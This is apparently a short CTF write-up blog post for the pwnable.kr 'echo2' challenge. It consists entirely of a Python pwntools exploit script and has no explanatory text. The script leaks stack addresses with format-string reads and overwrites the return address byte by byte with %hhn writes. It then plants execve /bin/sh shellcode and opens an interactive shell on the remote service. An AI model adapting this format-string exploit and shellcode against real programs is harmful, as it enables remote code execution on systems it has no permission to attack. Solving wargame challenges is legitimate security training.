---
layout: post
title: "pwnable-echo2"
date: 2016-01-31 00:04:14 +0800
comments: true
categories: 
---
'''python
from pwn import *
import re
import sys

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"



shellcode = shellcode.ljust((len(shellcode)/8 + 1) * 8, '\x90')
print len(shellcode)

p = remote('pwnable.kr', 9011)
#p = process('./echo2')
p.recvuntil('name?')
p.sendline('name')
def leak(i):
		p.recvuntil('>')
		p.sendline('2')
		p.sendline('%{0}$p'.format(i))
		data = p.recvuntil('exit')
		reo = re.compile('0x.*')
		try:
			addr = int(reo.findall(data)[0], 16) 
			return '0x%016x'%(addr)
		except:
			return '0x%016x'%(0)

if sys.argv[1] == '0':
	for i in range(30)[6::2]:
		print leak(i),
		print leak(i+1)

	

p.recvuntil('>')
p.sendline('2')
p.sendline('%21$p')
data = p.recvuntil('exit')
reo = re.compile('0x.*')
rip = int(reo.findall(data)[0], 16) - 224
print 'rip :',hex(rip)
#leak first
p.recvuntil('>')
p.sendline('2')
p.sendline('%47$p')
data = p.recvuntil('>')
reo = re.compile('0x.*')
addr = int(reo.findall(data)[0], 16)
b = addr & 0xffff
print '47'
print 'original:',hex(addr)
print 'b:',hex(b)

#leak 21
p.sendline('2')
p.sendline('%21$p')
data = p.recvuntil('exit')
addr = int(reo.findall(data)[0], 16)
a = addr & 0xffff
print '21'
print 'target addr context:',hex(addr)
print 'a:',hex(a)
differ = (b - a)/8
print 'differ: ',differ

def write_byte(address, cont):		#write one byte
	print 'address cont'
	print address.encode('hex'), cont.encode('hex')
	#leak first
	#print 'finall_____:',leak(47+differ)

	#change
	for i in range(8):
		p.recvuntil('>')
		p.sendline('2')
		p.sendline('%{0}d%21$hhn'.format(b - 4 + i))
		p.recvuntil('exit')
		p.recvuntil('>')
		p.sendline('2')
		if(u8(address[i: i+1]) == 0):
			p.sendline('%47$hhn'.format(u8(address[i: i+1])))
		else:
			p.sendline('%{0}d%47$hhn'.format(u8(address[i: i+1])))
		p.recvuntil('exit')
	#print 'finall_____:',leak(47+differ)

	#p.interactive()

	#write
	p.sendline('2')
	if(u8(cont) < 0xa):
		p.sendline('%{0}d%{1}$hhn'.format(u8(cont)+0x100, 47 + differ))
	else:
		print hex(u8(cont))
		p.sendline('%{0}d%{1}$hhn'.format(u8(cont), 47 + differ))
	p.recvuntil('exit')



def write_qword(address,cont):
	for i in range(8):
		write_byte(p64(address + i), cont[i: i+1])

write_qword(rip, p64(0x6020a8))
for i in range(len(shellcode)/8):
	write_qword(0x6020a8 + i*8, shellcode[8*i: 8*i + 8])




p.interactive()
'''
